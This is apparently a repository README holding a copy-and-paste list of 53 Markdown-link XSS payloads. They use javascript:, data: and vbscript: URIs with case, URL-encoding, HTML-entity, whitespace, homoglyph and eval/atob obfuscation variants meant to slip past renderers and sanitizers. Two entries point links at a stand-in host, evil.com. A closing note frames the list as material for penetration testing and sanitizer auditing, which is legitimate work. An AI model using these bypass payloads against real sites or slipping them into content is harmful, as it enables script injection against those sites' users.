# claude-gen-markdown-xss-payloads
claude generated. copy&amp;paste

comprehensive list of `javascript:alert()` payloads in Markdown link format using various encodings. 

---

### Plain / Case Variants
```markdown
[1. Plain](javascript:alert(1))
[2. Uppercase JS](JAVASCRIPT:alert(1))
[3. Mixed case](JaVaScRiPt:alert(1))
[4. Tab in scheme](java	script:alert(1))
[5. Newline in scheme](java
script:alert(1))
[6. Carriage return](java&#13;script:alert(1))
```

---

### URL Encoding
```markdown
[7. Full URL encode](javascript%3Aalert(1))
[8. Colon encoded]( javascript%3Aalert%281%29)
[9. Parentheses encoded](javascript:alert%281%29)
[10. All encoded](%6a%61%76%61%73%63%72%69%70%74%3aalert%281%29)
[11. Uppercase hex](%4A%41%56%41%53%43%52%49%50%54%3Aalert%281%29)
[12. Double URL encode](javascript%253Aalert(1))
[13. j encoded](%6avascript:alert(1))
[14. Partial encode](java%73cript:alert(1))
```

---

### HTML Entity Encoding
```markdown
[15. Colon as entity](javascript&#58;alert(1))
[16. Colon decimal](javascript&#x3A;alert(1))
[17. j as entity](&#106;avascript:alert(1))
[18. All chars decimal](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))
[19. All chars hex](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))
[20. Parens as entities](javascript:alert&#40;1&#41;)
[21. Mixed entities](&#106;avascript&#58;alert&#40;1&#41;)
```

---

### Whitespace / Control Characters
```markdown
[22. Leading space]( javascript:alert(1))
[23. Leading tab](	javascript:alert(1))
[24. Multiple spaces](   javascript:alert(1))
[25. Null byte](javascript\x00:alert(1))
[26. Soft hyphen](java­script:alert(1))
[27. Zero-width space](java​script:alert(1))
```

---

### Unicode / Homoglyphs
```markdown
[28. Unicode j](ʝavascript:alert(1))
[29. Full-width chars](ｊａｖａｓｃｒｉｐｔ:alert(1))
[30. Unicode escape](javascript:alert('\u0031'))
[31. Overlong UTF-8 colon](javascript%C0%BAalert(1))
```

---

### `data:` URI Variants
```markdown
[32. data HTML](data:text/html,<script>alert(1)</script>)
[33. data base64](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
[34. data URL encoded](data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E)
[35. data with charset](data:text/html;charset=utf-8,<script>alert(1)</script>)
```

---

### `vbscript:` (IE legacy)
```markdown
[36. vbscript](vbscript:msgbox(1))
[37. vbscript uppercase](VBSCRIPT:msgbox(1))
[38. vbscript encoded](%76%62%73%63%72%69%70%74:msgbox(1))
```

---

### Alert Variants (payload obfuscation)
```markdown
[39. String concat](javascript:ale'+'rt(1))
[40. eval base64](javascript:eval(atob('YWxlcnQoMSk=')))
[41. setTimeout](javascript:setTimeout('alert(1)',0))
[42. Function constructor](javascript:[].constructor.constructor('alert(1)')())
[43. Template literal](javascript:alert`1`)
[44. Encoded string arg](javascript:alert('\x31'))
[45. Unicode arg](javascript:alert('\u0031'))
[46. window.alert](javascript:window.alert(1))
[47. this.alert](javascript:this['al'+'ert'](1))
[48. location assign](javascript:location='javascript:alert(1)')
```

---

### Scheme Confusion
```markdown
[49. No scheme, relative path](//evil.com/xss)
[50. Protocol-relative](&#x2F;&#x2F;evil.com)
[51. javascript with entity colon](javascript&#x003A;alert(1))
[52. Slash variants](javascript://%0Aalert(1))
[53. JS comment bypass](javascript://comment%0Aalert(1))
```

---

> ⚠️ **Note:** Whether these actually execute depends entirely on the **Markdown renderer/sanitizer** being tested. Modern renderers (like GitHub's) block most of these. These payloads are intended for **security research, penetration testing, and sanitizer auditing** only.
